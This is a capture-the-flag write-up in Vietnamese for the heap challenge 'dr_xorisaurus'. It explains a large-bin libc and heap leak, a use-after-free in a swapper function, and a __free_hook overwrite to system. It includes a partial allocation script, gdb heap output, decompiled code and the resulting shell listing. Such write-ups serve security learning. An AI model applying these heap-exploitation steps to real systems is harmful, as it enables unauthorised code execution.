# write up dr_xorisaurus 
- với bài này đầu tiên sẽ phải đưa free chunk xuống large bin, đưa xuống large bin nhằm làm xuất hiện điạ chỉ libc và cả địa chỉ heap
- bài cho phép allocate 20 chunk là max
- allocate hết để xíu nữa bước tiếp theo có đủ chỗ cho consolidation
```python
for i in range(20):
    alloc(0x77,f"{i}"*0x20)
for i in range(19):
    free(i)
```
- vì scanf cũng có thể dùng malloc để đọc dữ liệu với kích thước lướn nên e sẽ cho buffer là 0x500 số 1 và khi scanf allocate chunk rồi free, nó sẽ consolidate tất cả chunk trong fastbin để nó bỏ vào large bin
- vì thế không free chunk cuối để nó không bị kết vào top chunk
```bash
tcachebins
0x80 [  7]: 0x55555555c5a0 —▸ 0x55555555c520 —▸ 0x55555555c4a0 —▸ 0x55555555c420 —▸ 0x55555555c3a0 —▸ 0x55555555c320 —▸ 0x55555555c2a0 ◂— 0
fastbins
empty
unsortedbin
empty
smallbins
empty
largebins
0x600-0x630: 0x55555555c610 —▸ 0x55555554c070 (main_arena+1232) ◂— 0x55555555c610
```
- sau khi có được chunk ở large bin, ta allocate 1 ít từ đó nó thì địa chỉ libc và địa chỉ heap sẽ xuất hiện, nhưng để leak được libc thì cần phải dựa vào hàm read, vì hàm read là hàm đọc dữ liệu trong chương trình, hàm read sẽ không để lại null byte ở cuối 
```
 puts("What chemicals are you dumping in: ");
  return read(0, (&listptr)[i], size);
```
- sau khi leak được mọi thứ thì ta dùng hàm khác là hàm swapper vì hàm này bị uaf
```
int swapper()
{
  unsigned __int64 idx; // rbx MAPDST
  __int64 choice; // [rsp+8h] [rbp-18h] BYREF

  if ( dword_4064 > 1 )
    return puts("Dr. Xorisaurus doesn't like mistakes, so you can only swap chemicals once!");
  ++dword_4064;
  printf("Which glass do you want to swap chemicals: ");
  scanf("%lu", &idx);
  if ( !(&listptr)[idx] || idx > 0x18 )
    return puts("That glass literally doesn't exist");
  puts("Alright, high tech machines are starting to clean this glass!");
  puts("Hmmm... seems like the glass is too contaminated. We will need to swap the glasses too!");
  free((&listptr)[idx]);
  printf("Which choice of glass flasks do you need?\n 1. 81 milliliters \n 2. 93 milliliters\n Choice: ");
  scanf("%lu", &choice);
  if ( choice == 1 )
    (&listptr)[idx] = (char **)malloc(0x51uLL);
  if ( choice == 2 )
    (&listptr)[idx] = (char **)malloc(0x5DuLL);
  puts("Quickly pour in a tiny bit of chemicals: ");
  return read(0, (&listptr)[idx], 8uLL);
```
- thì sẽ ghi được địa chỉ vào sau khi free và khi đó có thể control được vùng __free_hook để có thể chạy hàm system
```bash
[*] Switching to interactive mode
 Alright, time to get dirty and dump it all!
$ ls
$ ls
Dockerfile    dr_xorisaurus.c    dr_xorisaurus.id2  dr_xorisauruse  pow.py
Makefile    dr_xorisaurus.i64  dr_xorisaurus.md   flag.txt          remote.py
challenge.yaml    dr_xorisaurus.id0  dr_xorisaurus.nam  ld-2.32.so      solve
dr_xorisaurus    dr_xorisaurus.id1  dr_xorisaurus.til  libc.so.6
Dockerfile    dr_xorisaurus.c    dr_xorisaurus.id2  dr_xorisauruse  pow.py
Makefile    dr_xorisaurus.i64  dr_xorisaurus.md   flag.txt          remote.py
challenge.yaml    dr_xorisaurus.id0  dr_xorisaurus.nam  ld-2.32.so      solve
dr_xorisaurus    dr_xorisaurus.id1  dr_xorisaurus.til  libc.so.6
```
